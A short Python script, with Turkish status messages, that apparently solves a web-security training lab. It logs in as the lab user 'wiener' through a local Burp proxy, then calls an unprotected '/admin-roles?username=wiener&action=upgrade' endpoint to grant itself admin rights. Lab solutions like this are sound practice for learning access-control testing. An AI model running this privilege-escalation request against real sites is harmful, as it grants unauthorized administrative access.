import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }



def pro_to_admin(s, url):
    login_url = url + "/login"
    data = {"username": "wiener",
            "password": "peter"}

    r = s.post(login_url, data= data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res : 
        print("[+] Giriş okey")

        admin_roles_url = url + "/admin-roles?username=wiener&action=upgrade"
        r = s.get(admin_roles_url, verify=False, proxies=proxies)
        res = r.text
        if "Admin panel" in res:
            print("[+] Admin yetki okey")
        else:
            print("[+] Admin yetki okey değil")
            sys.exit(-1)



    else:
        print("[+] Giriş yok")
        sys.exit(-1)




if __name__ == "__main__":
    if len(sys.argv) !=2:
          print("(+) usage %s <url>" %sys.argv[0])
          print("(+) Example Url  %s www.example.com " %sys.argv[0])
          sys.exit(-1)
    
    url = sys.argv[1]
    s = requests.Session()
    print("[+] Admin panel arıyorum.......")
    pro_to_admin(s, url)
